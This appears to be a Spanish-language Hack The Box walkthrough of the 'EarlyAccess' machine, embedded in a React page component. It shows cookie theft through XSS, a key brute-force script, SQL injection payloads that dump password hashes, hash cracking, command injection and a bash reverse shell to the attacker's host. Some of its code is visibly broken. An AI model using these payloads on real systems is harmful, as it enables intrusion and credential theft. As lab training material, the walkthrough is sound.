import { CodeText } from '../../Components/CodeText'
import { Paragraph } from '../../Components/Paragraph'
import { SubThreeTitle } from '../../Components/Sub3Title'
import { SubFourTitle } from '../../Components/Sub4Title'
import { SubTitle } from '../../Components/SubTitle'
import { ContentBlock } from '../../Layout/ContentBlock'
import Image from 'next/image'
import { Highlighter } from '../../utils/SyntaxHighlighter'
import { Anchor } from '../../Components/Anchor'

export function EarlyAccess () {
  return (
    <>
      <ContentBlock>
        <Paragraph>
          La máquina de una compañía de juegos,
          incluiremos un XSS y seguidamente un SQLI para ganar acceso de Admin a la pagina de login, luego nos moveremos por el subdominio <i>game.earlyaccess.htb</i> y <i>dev.earlyaccess.htb</i>.
        </Paragraph>
        <Paragraph>
          Inyectaremos un payload una vez siendo Admin y obtendremos una consola en un contenedor de Docker, luego atacaremos una API para filtrar una contraseña e ingresaremos a otro contenedor de Docker, escalaremos privilegios a root ganando acceso al archivo shadow y la contraseña.
        </Paragraph>
        <Paragraph>
          Por último abusaremos capacidades en <i> /usr/sbin/arp </i>  para leer a través de arp como root la Flag y la llave SSH.
        </Paragraph>
      </ContentBlock>
      <ContentBlock>
        <SubTitle>
          Reconocimiento
        </SubTitle>
        <SubThreeTitle>
          nmap
        </SubThreeTitle>
        <Paragraph>
          Encontramos 3 puertos abiertos el 22, 80 y el 443
        </Paragraph>
        <Highlighter>
          leo@nardo$ nmap -p- --open --min-rate 5000 -Pn 10.10.11.110 -oG puertosAbiertos
        </Highlighter>
        <CodeText maper={[
          'Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:00 EDT',
          'Nmap scan report for earlyaccess.htb (10.10.11.110)',
          'Host is up (0.100s latency).',
          'Not shown: 65532 closed ports',
          'PORT    STATE SERVICE',
          '22/tcp  open  ssh',
          '80/tcp  open  http',
          '443/tcp open  https',
          'Nmap done: 1 IP address (1 host up) scanned in 103.76 seconds'
        ]}
        />
        <Highlighter
          text={`
leo@nardo$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
        `}
        />
        <CodeText
          maper={[
            'Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:02 EDT',
            'Nmap scan report for earlyaccess.htb (10.10.11.110)',
            'Host is up (0.093s latency).',
            'PORT    STATE SERVICE  VERSION',
            '22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0',
            '| ssh-hostkey:',
            '|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)',
            '|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)',
            '|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)',
            '80/tcp  open  http     Apache httpd 2.4.38',
            '|_http-server-header: Apache/2.4.38 (Debian)',
            '|_http-title: Did not follow redirect to https://earlyaccess.htb/',
            '443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))',
            '|_http-server-header: Apache/2.4.38 (Debian)',
            '|_http-title: EarlyAccess',
            '| ssl-cert: Subject: commonName=earlyaccess.htb/',
            'organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/',
            'countryName=AT',
            '| Not valid before: 2021-08-18T14:46:57',
            '|_Not valid after:  2022-08-18T14:46:57',
            '|_ssl-date: TLS randomness does not represent time',
            '| tls-alpn:',
            '|_  http/1.1',
            'Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/',
            'o:linux:linux_kernel',
            'Service detection performed. Please report any incorrect results at',
            'https://nmap.org/submit/ .',
            'Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds'
          ]}
        />
        <Paragraph>
          Googleando <i>OpenSSH 7.9p1 Debian 10+deb10u2 </i> sabemos que corre un Debian Buster.
        </Paragraph>
        <Paragraph>
          Editamos <i>/etc/hosts </i> y añadimos earlyaccess.htb.
        </Paragraph>
      </ContentBlock>
      <ContentBlock>
        <SubThreeTitle>
          earlyaccess.htb - TCP 443
        </SubThreeTitle>
        <Paragraph>
          Inspeccionando la página vemos un correo <i>admin@earlyaccess.htb</i>, al no ver nada interesante nos registramos con una cuenta.
        </Paragraph>
        <Paragraph>
          Una vez dentro nuestra cuenta vemos varias pestañas nuevas Home, Messaging, Forum, Store y Register Key, notamos que al enviar mensajes nos responden al instante probamos alguna SQLI pero no obtenemos nada.
        </Paragraph>
        <Paragraph>
          Sabemos que algunas veces los desarrolladores se enfocan en un solo apartado y se olvidan de otros, por ejemplo en la pestaña del perfil tenemos la opción de cambiar el nombre vemos si al enviar un mensaje con nuestro nuevo nombre <i>&#60;h1&gt;test &#60;h1&#62;</i> se interpreta HTML.
        </Paragraph>
        <Image
          src='/html_injection_gimp.webp'
          layout='responsive'
          width={700}
          height={475}
        />
        <Paragraph>
          Intentamos un secuestro de sesión, ponemos un servidor  por el puerto 80 y esperamos que admin abra nuestro mensaje para que nos llegue sus cookies y lo remplazamos en nuestra sesión actual.
        </Paragraph>
        <Image
          src='/hijack_session.webp'
          layout='responsive'
          width={828}
          height={113}
        />
        <Highlighter
          text='leo@nardo$ python3 -m http.server 80'
        />
        <CodeText
          maper={[
            'serving HTTP on 0.0.0.0 port 80 (https://0.0.0.0:80) ...',
            "cookie=XSFR-TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c;%20earlyaccess_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c HTTP/1.1' 200 -"
          ]}
        />
        <Paragraph />
        <Image
          src='/replace_session.webp'
          layout='responsive'
          width={400}
          height={75}
        />
        <Paragraph>
          Reemplazamos, refrescamos y wualaaaaaa.
          ¡Somos Admin!
        </Paragraph>
      </ContentBlock>
      <ContentBlock>
        <SubThreeTitle>
          game.earlyaccess.htb - TCP 80
        </SubThreeTitle>
        <Paragraph>
          Vemos dos nuevas pestañas game y dev, nos llevan a dos subdominios <i>dev.earlyaccess.htb</i> y <i>game.earlyaccess.htb</i> lo añadimos a <i> /etc/hosts </i> e ingresamos.
        </Paragraph>
        <Paragraph>
          En la pestaña de Admin, vemos Download backup, lo descargamos y obtenemos validate.py
        </Paragraph>
        <Image
          src='/admin_bac.webp'
          layout='responsive'
          width={400}
          height={200}
        />

      </ContentBlock>
      <ContentBlock>
        <SubThreeTitle>
          backup.zip - validate.py
        </SubThreeTitle>
        <SubFourTitle>
          Análisis del algoritmo.
        </SubFourTitle>
        <Paragraph>
          Cortaremos en trozos el algoritmo para leerlo mejor.
        </Paragraph>
        <Highlighter
          text={`
class Key:    
  key = ""
  magic_val = "XP" # Static (same on API)    
  magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
  
  def __init__(self, key:str, magic_num:int=346):    
    self.key = key    
    if magic_num != 0:    
      self.magic_num = magic_num

  @staticmethod
  def info() -> str:
    return f"""
    # Game-Key validator #

    can be used to quickly verify a user's game key, when the API is down (again).

    keys look like following:
    AAAAA-BBBBB-CCCC1-DDDDD-1234

    Usage: {sys.argv[0]} <game-key>""" 

  def valid_format(self) -> bool:
    return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

  def calc_cs(self) -> int:      
    gs = self.key.split('-')[:-1]                                    
    return sum([sum(bytearray(g.encode())) for g in gs])

  def g1_valid(self) -> bool:
    g1 = self.key.split('-')[0]
    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
    if r != [221, 81, 145]:
        return False                                     
    for v in g1[3:]:
        try:   
            int(v)
        except:       
            return False
    return len(set(g1)) == len(g1)

  def g2_valid(self) -> bool:
    g2 = self.key.split('-')[1]
    p1 = g2[::2]
    p2 = g2[1::2]
    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

  def g3_valid(self) -> bool:
    # TODO: Add mechanism to sync magic_num with API
    g3 = self.key.split('-')[2]
    if g3[0:2] == self.magic_value:
      return sum(bytearray(g3.encode())) == self.magic_num
    else:
      return False

  def g4_valid(self) -> bool:
    return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

  def cs_valid(self) -> bool:
    cs = int(self.key.split('-')[-1])
    return self.calc_cs() == cs

    def check(self) -> bool:
    if not self.valid_format():
        print('Key format invalid!')
        return False
    if not self.g1_valid():
        return False
    if not self.g2_valid():
        return False
    if not self.g3_valid():
        return False
    if not self.g4_valid():
        return False
    if not self.cs_valid():
        print('[Critical] Checksum verification failed!')
        return False
    return True

if __name__ == "__main__":
  if len(sys.argv) != 2:    
      print(Key.info())     
      sys.exit(-1)         
  input = sys.argv[1] 
  validator = Key(input) 
  if validator.check():     
      print(f"Entered key is valid!")
  else:                                  
      print(f"Entered key is invalid!")`.trim()}
        />
        <Paragraph>
          Vemos que nuestra llave debe tener el formato <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i> donde <i>A</i> es una letra o número alfanumérico mayúscula de la A a la Z y del 0 al 9, donde <i>B </i> es una letra alfabética de la A a la Z, y donde <i>1 </i> representa un número del 0 al 9 separado por <i>-</i>.
        </Paragraph>
        <Highlighter
          text={`def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))`.trim()}
        />
      </ContentBlock>
      <ContentBlock>
        <SubFourTitle>
          g1 - función
        </SubFourTitle>
        <Highlighter
          text={`
def g1_valid(self) -> bool:
g1 = self.key.split('-')[0]
r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
if r != [221, 81, 145]:
    return False                                     
for v in g1[3:]:
    try:   
        int(v)
    except:       
        return False
return len(set(g1)) == len(g1)
        `}
        />
        <Paragraph>
          Coge los primeros 3 caracteres y hace un Bitwise Left Shift operator por cada carácter recorriendo 1, 2, 3 bits respectivamente, luego hace un modulo de 256 y un Bitwise XOR del mismo carácter y por último el resultado lo compara con 221, 81 y 145.
        </Paragraph>
        <Paragraph>
          Intuimos que concatenando números y todas las letras del alfabeto y aplicando la lógica de la función y pasándole la posición 0, 1 y 2 obtendremos nuestro <i>g1</i> como en el siguiente script y lo podemos filtrar por 221 luego por 81 y 145.
        </Paragraph>
        <Highlighter
          text={`
#!/usr/bin/python3
import sys, string

i = int(sys.argv[1])

for v in string.ascii_uppercase + string.digits:
value = (ord(v)<<i+1)%256^ord(v)
print((f"{v}: {value}: {i}))
`.trim()}
        />
        <Highlighter
          text={`
  leo@nardo$ python3 script.py 0 | grep 221
`.trim()}
        />
        <CodeText
          maper={[
            'K: 221: 0'
          ]}
        />
        <Paragraph>
          Obtenemos nuestra cadena mágica para la función g1 <i>KEY25</i>, los últimos dos caracteres son números arbitrarios pero no únicos.
        </Paragraph>
        <Highlighter
          text={`
  return len(set(g1)) == len(g1)
`.trim()}
        />
      </ContentBlock>
      <ContentBlock>
        <SubFourTitle>
          g2 - función
        </SubFourTitle>
        <Highlighter
          text={`
def g2_valid(self) -> bool:
  g2 = self.key.split('-')[1]
  p1 = g2[::2]
  p2 = g2[1::2]
  return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
        `}
        />
        <Paragraph>
          Cogemos la segunda parte de nuestra <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i>,
          para <i>p1 = "ABCDE"[::2]</i> python coge los caracteres pares en este caso <i>ACE, </i> para <i>p2 = "ABCDE"[1::2]</i> obtenemos <i>BD</i>  en las posiciones impares.
        </Paragraph>
        <Paragraph>
          Por último, debemos comprobar que <i>p1</i> sea igual a <i>p2</i>.
        </Paragraph>
        <Highlighter
          text={`
g2 = "0H0H0"
p1 = g2[::2]
p2 = g2[1::2]
sum(bytearray(p1.encode()))
### 144
sum(bytearray(p2.encode()))
### 144
        `}
        />
      </ContentBlock>
      <ContentBlock>
        <SubFourTitle>
          g3 - función
        </SubFourTitle>
        <Paragraph>
          Cogemos la tercera parte de nuestra llave <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i>.
        </Paragraph>
        <Highlighter
          text={`
def g3_valid(self) -> bool:
# TODO: Add mechanism to sync magic_num with API
g3 = self.key.split('-')[2]
if g3[0:2] == self.magic_value:
    return sum(bytearray(g3.encode())) == self.magic_num
else:
    return False
        `}
        />
        <Paragraph>
          Entramos al <i>if</i> y vemos qué dado <i>BBBB1</i> los
          dos primeros caracteres serán <i>XP = magic_value</i> los
          dos siguientes cualquier letra del alfabeto de la A a la Z
          y el último un número.
        </Paragraph>
        <Paragraph>
          Notemos que la mayor suma posible es <i>sum(bytearray("XPZZ9".encode()))</i>
          y nos da <i>405</i> y la menor suma posible será <i>sum(bytearray("XPAA0".encode()))</i>
          que da <i>346</i> y restando nos da <i>60</i> añadiendo el cero.
        </Paragraph>
        <Highlighter
          text={`
#!/usr/bin/python3
>> 405 - 346
>> 59
        `}
        />
        <Paragraph>
          Esto es ya que a simple vista podríamos pensar que son <i> 26*26*10 = 6760 </i> posibilidades,
          teniendo la <i>cadena = "XPAA0"</i> nos da <i>346</i>, pero no importaría el orden de los caracteres
          puesto que <i>"AA0XP"</i> o <i>"AAXP0"</i> es 346, debemos tener en cuenta que los dos primeros
          caracteres deben ser <i>XP</i> y el último carácter un número es por eso que estamos buscando cadenas
          Únicas que den una única suma del <i>346</i> al <i>405</i>.
        </Paragraph>
        <Highlighter
          text={`
#!/usr/bin/python3
>> 405 - 346
>> 59
        `}
        />
        <Paragraph>
          Crearemos un script en python para ver las posibles combinaciones.
        </Paragraph>
        <Paragraph>
          Importamos <i>string</i> y <i>product</i> para <i>p1</i> creamos una
          serie de dos caracteres de la A a la Z e iteramos por cada cadena generada
          para coger una suma y en un diccionario lo metemos en una posición para tener
          únicas combinaciones.
        </Paragraph>
        <Highlighter
          text={`
#!/usr/bin/python3
import string
from itertools import product

p1 = product(string.ascii_uppercase, repeat=2)
p1 = [ "".join(i) for i in p1 ]
uniques = {}

for i in p1:
  for j in range(0, 10):
    cadena = f"XP{i}{j}"
    value = sum(bytearray(cadena.encode()))
    uniques[value] = cadena

print(''.join(uniques.values()))
        `}
        />
        <Highlighter
          text={`
XPAA0 XPBA0 XPCA0 XPDA0 XPEA0 XPFA0 XPGA0 XPHA0 XPIA0 XPJA0 XPKA0 XPLA0 XPMA0 XPNA0 XPOA0 XPPA0 XPQA0 XPRA0 XPSA0 XPTA0 XPUA0 XPVA0 XPWA0 XPXA0 XPYA0 XPZA0 XPZB0 XPZC0 XPZD0 XPZE0 XPZF0 XPZG0 XPZH0 XPZI0 XPZJ0 XPZK0 XPZL0 XPZM0 XPZN0 XPZO0 XPZP0 XPZQ0 XPZR0 XPZS0 XPZT0 XPZU0 XPZV0 XPZW0 XPZX0 XPZY0 XPZZ0 XPZZ1 XPZZ2 XPZZ3 XPZZ4 XPZZ5 XPZZ6 XPZZ7 XPZZ8 XPZZ9
      `}
        />
      </ContentBlock>
      <ContentBlock>
        <SubFourTitle>
          g4 - función
        </SubFourTitle>
        <Highlighter
          text={`
def g4_valid(self) -> bool:
return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]}`}
        />
        <Paragraph>
          Tenemos <i>g1</i>, pero no sabemos cuál es <i>g4</i>, sin embargo, <i>ord() function</i> es reversible, entonces obtenemos un <i>g4</i> válido aplicando:
        </Paragraph>
        <Highlighter
          text={`
[chr(i^ord(g)) for g, i in zip("KEY25", [12, 4, 20, 117, 0])]
>> ['G', 'A', 'M', 'G', '5'] # valid g4
        `}
        />
        <Paragraph>
          El quinto carácter de <i>g1</i> podría fallar si es cero o si son caracteres repetidos <i>KEY66</i> no funcionaria.
        </Paragraph>
      </ContentBlock>
      <ContentBlock>
        <SubFourTitle>
          Generando key válida
        </SubFourTitle>
        <Paragraph>
          A este punto tenemos <i>g1, g2, g3 y g4</i>, <i>cs_sum</i> será generado automático en la función cs_sum.
        </Paragraph>
        <Highlighter
          text={`
#!/usr/bin/python

from itertools import product
import time, sys, string, requests, urllib3
from pwn import *

def calc_cs(key) -> int:      
  gs = key.split('-')[:-1]                                    
  return sum([sum(bytearray(g.encode())) for g in gs])


def gen_g3():
  p1 = product(string.ascii_uppercase, repeat=2)
  p1 = [ "".join(i) for i in p1 ]
  uniques = {}

  for i in p1:
    for j in range(0, 10):
      cadena = f"XP{i}{j}"
      value = sum(bytearray(cadena.encode()))
      uniques[value] = cadena

  return uniques.values()

def generateKeys():
  g3s = gen_g3)
  totalkeys = []
  for g3 in g3s:
    key = f'KEY25-0H0H0-{g3}-'
    cs = calc_cs(key)
    full_key = key + str(cs)
    totalkeys.append(full_key)
    return totalkeys

def do_post(keys):
  url_login = 'https://earlyaccess.htb/login'
  url_key = 'https://earlyaccess.htb/key'
  url_try_key = 'https://earlyaccess.htb/key/add'
  s = requests.session()
  s.verify = False

  r = s.get(url_login)

  token = re.findall(r'name="_token" value="(.*?)"', r.text[0])
  post_data = {
      '_token': token,
      'email': 'leonardo@leonardo.com',
      'password': 'leonardo1234'
  }

  r = s.post(url_login, data=post_data)
  
  p1 = log.progress("Fuerza Bruta")
  p1.status("Iniciando...")
  counter = 1

  for key in keys:

      p1.status("Intentando con la key %s [%d/60]" % (key, counter))

      r = s.get(url_key)
      token = re.findall(f'name="_token" value = "(.*?)"', r.text)[0]
      
      post_data = {
          '_token': token,
          'key': key
      }
      r = s.post(url_try_key, data=post_data)
      
      if "Game-key is invalid!" not in r.text:
          p1.success("KEY %s" % key)
          sys.exit(0)
      
      time.sleep(2)
      counter += 1

if __name__ == '__main__':
  keys = generateKeys()
  do_post(keys)          
        `}
        />
        <Paragraph>
          Importamos unas librerías, generamos nuestro <i>g3</i> y lo añadimos a una lista, nuestras posibles keys válidas
          luego hacemos una petición a <i>/login</i> con nuestra cuenta creada y arrastramos posteriormente nuestra sesión
          para hacer peticiones <i>post</i> por cada key y actualizando el token de <i>/key</i>.
        </Paragraph>
        <Image
          src='/key_page.webp'
          layout='responsive'
          width={506}
          height={345}
        />
      </ContentBlock>
      <ContentBlock>
        <SubTitle>
          Dev Access
        </SubTitle>
        <Paragraph>
          Refrescamos la página e ingresamos a <i>game.earlyaccess.htb</i>.
        </Paragraph>
        <Image
          src='/game_version.webp'
          layout='responsive'
          width={700}
          height={662}
        />
        <Paragraph>
          Después de jugar al juego de la serpiente, nos vamos a la pestaña de scoreboard
          y vemos el tablero.
        </Paragraph>
        <Image
          src='/scoreboard_top_ten.webp'
          layout='responsive'
          width={592}
          height={296}
        />
        <Paragraph>
          Recordemos que en el foro hablaban que había un error en la parte del scoreboard
          relacionado con el nombre de usuario.
        </Paragraph>
        <Image
          src='/scoreboard_comment.webp'
          layout='responsive'
          width={592}
          height={296}
        />
        <Paragraph>
          Nos vamos a la pestaña de Perfil y añadimos una <i>'</i> al final de nuestro nombre
          retornamos al scoreboard...
        </Paragraph>
        <Image
          src='/scoreboard_error.webp'
          layout='responsive'
          width={1266}
          height={277}
        />
        <Paragraph>
          Basado en la respuesta, añadimos un paréntesis al final, actualizamos nuestro
          nombre de usuario <i>leonardo') -- -</i> y vemos que en el score no tenemos error
          es una buena señal porque ahora podremos leer la DB.
        </Paragraph>
        <Paragraph>
          Hay muchas formas de tener acceso basado en <i>SQL</i> nosotros usaremos la siguiente
          lógica.
        </Paragraph>
        <Highlighter
          text={`
leonardo') order by 3-- -
        `}
        />
        <Highlighter
          text={`
leonardo') union select 1, 2, database()-- -
        `}
        />
        <Highlighter
          text={`
leonardo') union select 1, 2, table_name from information_schema.tables where table_schema="db"-- -
        `}
        />
        <Highlighter
          text={`
leonardo') union select 1, 2, table_name from information_schema.tables where table_schema=0x6462-- -
        `}
        />
        <Highlighter
          text={`
leonardo') union select 1, 2, column_name from information_schema.columns where table_schema=0x6462 and table_name='users'-- -
        `}
        />
        <Highlighter
          text={`
leonardo') union select 1, 2, group_concat(name, 0x3a, password) from users-- -
        `}
        />
        <Image
          src='/passwords.webp'
          layout='responsive'
          width={1287}
          height={357}
        />
        <Paragraph>
          Guardamos el texto en un archivo <i>hash.txt</i> para luego intentar romperlo con <Anchor src='https://github.com/openwall/john'>jhon</Anchor>.
        </Paragraph>
        <Highlighter
          text={`
jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
        `}
        />
        <Paragraph>
          !SAS¡Iniciamos sesión en <i>https://dev.earlyaccess.htb/index.php</i> con la contraseña <i>gameover</i>.
        </Paragraph>
      </ContentBlock>
      <ContentBlock>
        <SubTitle>
          Shell como www-data - Admin
        </SubTitle>
        <Image
          src='/admin_login.webp'
          layout='responsive'
          width={840}
          height={1374}
        />
        <Paragraph>
          Vemos una herramienta de hasheo, cuál texto ingresado lo
          convierte en <i>MD5</i> o <i>SHA1</i>..
        </Paragraph>
        <Image
          src='/early_admin_HASH.webp'
          layout='responsive'
          width={435}
          height={307}
        />
        <Paragraph>
          al ver con más cuidado y utilizando <i>Burpsuite</i> hace una petición a <i>/actions/hash.php</i>.
        </Paragraph>
        <Highlighter
          text={`
action=hash&redirect=true&password=leonardo1234&hash_function=md5
        `}
        />
        <Paragraph>
          La respuesta es una redirección 302 a <i>/home.php?tool=hashing</i> y nos retorna con el hash.
        </Paragraph>
        <Paragraph>
          A este punto pensamos que existen más archivos <i>.php</i> en el directorio <i>/actions</i> así que vamos
          a aplicar un <i>fuzzing</i> a esta ruta.
        </Paragraph>
        <Highlighter
          text={`
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
        `}
        />
        <Highlighter
          text={`
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=asd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================

000001316:   500        0 L      10 W       89 Ch       "filepath"                           

Total time: 48.76479
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 53.07106

        `}
        />
        <Paragraph>
          Tenemos un parámetro!, Al apuntar a <i>asd</i> nos retorna <i>invalid path</i> pero por ejemplo
          al cambiar a un archi que sabemos que existe por ejemplo <i>file.php</i> nos retorna un código de estado
          exitoso.
        </Paragraph>
        <Image
          src='/early_filepath.webp'
          layout='responsive'
          width={687}
          height={235}
        />
        <Paragraph>
          Aplicaremos <Anchor src='https://www.php.net/manual/es/wrappers.php.php'>wrappers</Anchor>, y convertiremos el texto en <i>base64</i> para luego
          leerlo.
        </Paragraph>
        <Image
          src='/early_wrapper.webp'
          layout='responsive'
          width={902}
          height={47}
        />
        <Highlighter
          text={`
echo base64.txt | base64 -d > hash.php
        `}
        />
      </ContentBlock>
      <ContentBlock>
        <SubTitle>
          hash.php | source code
        </SubTitle>
        <Paragraph>
          Al final del archivo vemos una función <i>hash_pw</i> la cual llama la atención
          en <i>php</i> si la función tiene una @ antes el <i>string</i> recibido lo trata como
          si fuera una función.
        </Paragraph>
        <Highlighter
          text={`
function hash_pw($hash_function, $password)
{
  // DEVELOPER-NOTE: There has gotta be an easier way...
  ob_start();
  // Use inputted hash_function to hash password
  $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
  }
        `}
        />
        <Paragraph>
          Notamos que hay una variable llamada debug, y dice que permite hashes personalizados,
          el desarrollador debió dejar esto a propósito para temas de debug...
        </Paragraph>
        <Highlighter
          text={`
if(isset($_REQUEST['action']))
{
if($_REQUEST['action'] === "verify")
{                                      
    // VERIFIES $password AGAINST $hash

    if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
    {                                                 
        // Only allow custom hashes, if debug is set
        if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
            throw new Exception("Only MD5 and SHA1 are currently supported!");

        $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
                                                            
        $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
        header('Location: /home.php?tool=hashing');
        return;
    }
}
        `}
        />
        <Paragraph>
          Tal vez si encontramos una forma de manipular esta data con <i>Burpsuite</i> podremos ganar
          acceso al sistema.
        </Paragraph>
        <Highlighter
          text={`
action=hash&redirect=true&password=id&hash_function=system&debug=asd
        `}
        />
        <Image
          src='/early_hash_pwn.webp'
          layout='responsive'
          width={481}
          height={93}
        />
        <Paragraph>
          Solo queda darnos una reverse shell.
        </Paragraph>
        <Highlighter
          text={`
action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
        `}
        />
        <Paragraph>
          ponemos en <i>url encode</i> para evitarnos errores y escuchamos en nuestro local con netcat.
        </Paragraph>
        <Highlighter
          text={`
leo@nardo$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
hostname -I
172.18.0.102
        `}
        />
        <Paragraph>
          Vemos que estamos en un contenedor, ya que nuestro target es <i>10.10.11.110</i>,
          ahora tenemos acceso al sistema antes de continuar hacemos un tratamiento de la consola con <i>script</i>.
        </Paragraph>
        <Highlighter
          text={`
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
<rlyaccess.htb/dev/actions$ script /dev/null -c bash
Script started, file is /dev/null
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
zsh: suspended nc -nlvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 
        `}
        />
        <SubTitle>
          Usuario game-adm | Shell
        </SubTitle>
        <SubThreeTitle>
          Enumeration
        </SubThreeTitle>
        <Paragraph>
          Nos dirigimos a <i>/home</i>, visualizamos un usuario <i>www-adm</i> y un archivo <i>.wgetrc</i>
          que puede ser interesante.
        </Paragraph>
        <Highlighter
          text={`
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home
www-data@webserver:/home$ ls
www-adm
www-data@webserver:/home$ cd www-adm
www-data@webserver:/home/www-adm$ ls -la
drwxr-xr-x 2 www-adm www-adm 4096 Feb 14 20:41 .
drwxr-xr-x 1   root   root   4096 Feb 14 20:41 ..
drwxrwxrwx 1   root   root   4096 Feb 9  20:41 .bash_history -> /dev/null
-rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 www-adm www-adm  887 Apr 18  2019 .profile
-r-------- 1 www-adm www-adm   33 Feb 14 20:41 .wgetrc
www-data@webserver:/home/www-adm$ cat .wgetrc
cat: .wgetrc: Permission denied
        `}
        />
        <Paragraph>
          Vemos si las credenciales anteriores en <i>https://dev.earlyaccess.htb</i> son reutilizables.
        </Paragraph>
        <Highlighter
          text={`
www-data@webserver:/home/www-adm$ su www-adm
Password:
www-adm@webserver:~$
        `}
        />
        <Paragraph>
          Estando como el usuario <i>www-adm</i> vemos si podemos ver <i>cat ~/.wgetrc</i>
        </Paragraph>
        <Highlighter
          text={`
www-adm@webserver:$ cat ~/.wgetrc
user=api
password=s3Cur3_API_PW!
www-adm@webserver:$
        `}
        />
        <Paragraph>
          Ahora, utilizando nc, verificaremos si existe alguna máquina con el nombre <i>API</i>
        </Paragraph>
        <Highlighter
          text={`
www-adm@webserver:$ nc API 80
API [172.18.0.101] 80 (http) : Connection refused
        `}
        />
        <Paragraph>
          y si existe tal máquina lo que no sabemos es que puertos tiene abiertos para
          ello crearemos un escáner en <i>/tmp</i>
        </Paragraph>
        <Highlighter
          text={`
for port in $(seq 1 65535); do
  timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.101/$port" 2>/dev/null && echo "[+] $port - Open" &
done; wait
        `}
        />
        <Paragraph>
          Ejecutamos nuestro script...
        </Paragraph>
        <Highlighter
          text={`
www-adm@webserver:/tmp$ ./scan.sh
      [+] 5000 - Open
        `}
        />
        <Paragraph>
          Observamos el puerto 5000 abierto, intentaremos descargarlo...
        </Paragraph>
        <Highlighter
          text={`
www-adm@webserver:/tmp$ wget http://172.18.0.101:5000
        `}
        />
        <Paragraph>
          vemos un archivo <i>index.html</i> que dice: <i>Welcome to the game-key verification API! You can verify your keys via: /verify/game-key. If you are using manual ... te database using /check_db</i>
          vemos un archivo <i>check_db</i>, lo descargamos...
        </Paragraph>
        <Highlighter
          text={`
www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
        `}
        />
        <Image
          src='/early_json_pass.webp'
          layout='responsive'
          width={721}
          height={795}
        />
        <Paragraph>
          ingresamos por ssh a la <i>10.10.11.110</i> con las credenciales <i>drew</i>.
        </Paragraph>
        <Highlighter
          text={`
sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110
drew@earlyacccess:~$ ls
user.txt
drew@earlyacccess:~$ cat user.txt
**************************
        `}
        />
